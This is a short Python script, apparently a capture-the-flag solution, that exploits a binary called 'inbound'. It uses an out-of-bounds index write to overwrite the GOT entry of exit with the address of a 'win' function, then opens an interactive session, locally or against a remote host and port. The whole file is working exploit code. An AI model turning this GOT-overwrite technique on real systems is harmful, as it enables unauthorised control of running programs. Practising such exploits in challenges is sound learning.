#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./inbound")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("34.170.146.252", 51979)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    exit_got = unwrap(exe.got("exit"))
    slot_addr = unwrap(exe.symbol("slot"))
    win_addr = unwrap(exe.symbol("win"))

    offset = exit_got - slot_addr
    io.sendlineafter(b"index: ", str(offset // 4))
    io.sendlineafter(b"value: ", str(win_addr))

    io.interactive()
    return


if __name__ == "__main__":
    main()
